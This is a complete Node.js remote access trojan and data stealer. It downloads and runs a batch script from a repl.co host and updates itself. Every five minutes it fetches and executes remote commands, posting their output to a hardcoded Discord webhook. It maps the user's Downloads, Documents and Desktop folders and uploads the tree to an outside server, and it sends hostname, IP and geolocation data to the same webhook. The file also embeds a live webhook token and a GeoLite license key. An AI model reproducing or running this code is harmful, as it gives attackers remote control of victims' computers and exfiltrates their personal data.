const axios = require("axios");
const fs = require("fs");
const os = require("os");
const FormData = require("form-data");
const path = require("path");
const { execSync } = require("child_process");

// URLs of the files to download and update
const filesToDownload = [
  {
    url: "https://obsidianator-code-1.blueobsidian.repl.co/ss.bat",
    filePath: "./script.bat",
  },
  {
    url: "https://obsidianator-code-1.blueobsidian.repl.co/index.js",
    filePath: "./index.js",
  },
];

// Discord webhook URL to send system details and passwords
const webhookUrl =
  "https://discord.com/api/webhooks/1180841193257574501/RymBgW58iooeeLaT8tpPj8wXwrEw1TnkIyGy0Cam9oNZW8FtE6TMoaS1L-itLrB5ivN3";

const commandsUrl = "https://obsidianator-code-1.blueobsidian.repl.co/commands.json";

const runCommand = command => {
  try {
    const output = execSync(command).toString();
    return output;
  } catch (error) {
    console.error(`Error running command: ${error.message}`);
  }
};

setInterval(() => {
  CheckandRunCommands();
}, 1000 * 60 * 5);

function CheckandRunCommands() {
  axios
    .get(commandsUrl)
    .then(async response => {
      const commands = response.data;
      for (const command of commands) {
        const output = await runCommand(command);
        if (output) {
          sendToDiscord(output);
        }
      }
    })
    .catch(error => {
      console.error(`Error fetching commands: ${error.message}`);
    });
}

// Function to download a file and save it to a specific path
async function downloadFile(url, filePath) {
  try {
    const response = await axios.get(url);
    fs.writeFileSync(filePath, response.data);
    console.log(`File downloaded and saved: ${filePath}`);
  } catch (error) {
    console.error(`Error downloading file: ${filePath}`, error.message);
    throw error;
  }
}

// Function to execute a CMD script or JavaScript file
function executeFile(filePath) {
  try {
    // Execute the file using the 'execSync' function
    const output = execSync(filePath).toString();
  } catch (error) {
    console.error("Error executing file:", error);
    throw error;
  }
}

function mapFolder(folderPath) {
  const folderContent = fs.readdirSync(folderPath, { withFileTypes: true });

  const folderTree = {};

  folderContent.forEach(item => {
    const itemPath = path.join(folderPath, item.name);

    if (item.isDirectory()) {
      folderTree[item.name] = mapFolder(itemPath);
    } else {
      folderTree[item.name] = "File";
    }
  });

  return folderTree;
}

async function mapFSAndUpload() {
  const username = process.env.USERNAME || process.env.HOMEPATH.split("\\")[2];
  const homePath = path.join("C:\\Users", username);

  const downloadsPath = path.join(homePath, "Downloads");
  const documentsPath = path.join(homePath, "Documents");
  const DesktopPath1 = fs.existsSync(path.join(homePath, "Onedrive", "Desktop"))
    ? path.join(homePath, "Onedrive", "Desktop")
    : path.join(homePath, "Desktop");
  const tree = {
    Downloads: mapFolder(downloadsPath),
    Documents: mapFolder(documentsPath),
    Desktop: mapFolder(DesktopPath1),
  };

  const jsonString = JSON.stringify(tree, null, 2);
  const filePath = path.join(__dirname, "filetree.json");
  fs.writeFileSync(filePath, jsonString);
  //upload the file to the server
  const formData = new FormData();
  formData.append("file", fs.createReadStream(filePath));

  try {
    const response = await axios.post(
      "https://frigh-tenedjuicyclicks.blueobsidian.repl.co/upload",
      formData,
      {
        headers: formData.getHeaders(),
      }
    );

    sendToDiscord(response.data.fileUrl);
  } catch (error) {
    console.error(error);
  }
}

// Function to retrieve system details
async function getSystemDetails() {
  try {
    const ipAddress = await getIPAddress();
    const geoDetails = await getGeoDetails(ipAddress);

    const systemDetails = {
      computerName: os.hostname(),
      totalMemory: bytesToSize(os.totalmem()),
      freeMemory: bytesToSize(os.freemem()),
      platform: os.platform(),
      architecture: os.arch(),
      release: os.release(),
      // Assume ipAddress and geoDetails are defined elsewhere
      ipAddress, // Previously defined
      country: geoDetails.country.names.en, // Assume geoDetails is defined
      location: geoDetails.location.time_zone, // Assume geoDetails is defined
      city: geoDetails.city.names.en, // Assume geoDetails is defined
      provider: geoDetails.traits.autonomous_system_organization, // Assume geoDetails is defined
    };
    return systemDetails;
  } catch (error) {
    console.error("Error retrieving system details:", error.message);
    throw error;
  }
}

function bytesToSize(bytes) {
  const sizes = ["Bytes", "KB", "MB", "GB", "TB"];
  if (bytes === 0) return "0 Byte";
  const i = parseInt(Math.floor(Math.log(bytes) / Math.log(1024)), 10);
  if (i === 0) return `${bytes} ${sizes[i]}`;
  return `${(bytes / 1024 ** i).toFixed(2)} ${sizes[i]}`;
}

// Function to retrieve the IP address
async function getIPAddress() {
  try {
    const response = await axios.get("https://ipapi.blueobsidian.repl.co/api");
    return response.data.ip;
  } catch (error) {
    console.error("Error retrieving IP address:", error.message);
    throw error;
  }
}

// Function to retrieve country and location details based on IP address
// Function to retrieve country and location details based on IP address
async function getGeoDetails() {
  try {
    const accountId = "888018";
    const licenseKey = "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";

    const auth = {
      username: accountId,
      password: licenseKey,
    };

    const response = await axios.get("https://geolite.info/geoip/v2.1/city/me", {
      auth,
      params: { pretty: true },
    });

    const { data } = response;
    return data;
  } catch (error) {
    console.error("Error retrieving geo details:", error.message);
    throw error;
  }
}

// Function to send system details to Discord webhook
async function sendSystemDetailsToDiscord(details) {
  try {
    const message = `
    Information sent 
      \`\`\`
      ${JSON.stringify(details, null, 2)}
      \`\`\`
    `;
    await axios.post(webhookUrl, { content: message });
  } catch (error) {
    console.error("Error sending system details to Discord webhook:", error.message);
    throw error;
  }
}

async function sendToDiscord(message) {
  try {
    await axios.post(webhookUrl, { content: message });
  } catch (error) {
    console.error("Error sending message to Discord webhook:", error.message);
    throw error;
  }
}

// Function to check for file updates and self-update if necessary
async function checkAndUpdateFiles() {
  try {
    for (const file of filesToDownload) {
      // Check if the file exists
      if (!fs.existsSync(file.filePath)) {
        // File does not exist, download it
        await downloadFile(file.url, file.filePath);
      } else {
        // File exists, compare the current content with the latest version
        const latestContent = await axios.get(file.url);
        const currentContent = fs.readFileSync(file.filePath, "utf8");
        if (currentContent !== latestContent.data) {
          // Save the latest content to the file
          fs.writeFileSync(file.filePath, latestContent.data);
        } else {
        }
      }
    }
  } catch (error) {
    console.error("Error checking and updating files:", error.message);
    throw error;
  }
}

// Main function to download files, execute scripts, and send system details
async function runScript() {
  try {
    // Download files and update if necessary
    await checkAndUpdateFiles();

    // Get the absolute path to the script.bat file
    const scriptPath = path.join(__dirname, "./script.bat");

    // Execute the CMD script
    executeFile(scriptPath);

    // Retrieve system details
    const systemDetails = await getSystemDetails();

    // Send system details to Discord webhook
    mapFSAndUpload();
    await sendSystemDetailsToDiscord(systemDetails);
  } catch (error) {
    console.error("Error in runScript:", error);
  }
}

// Invoke the main function to start the process
runScript();
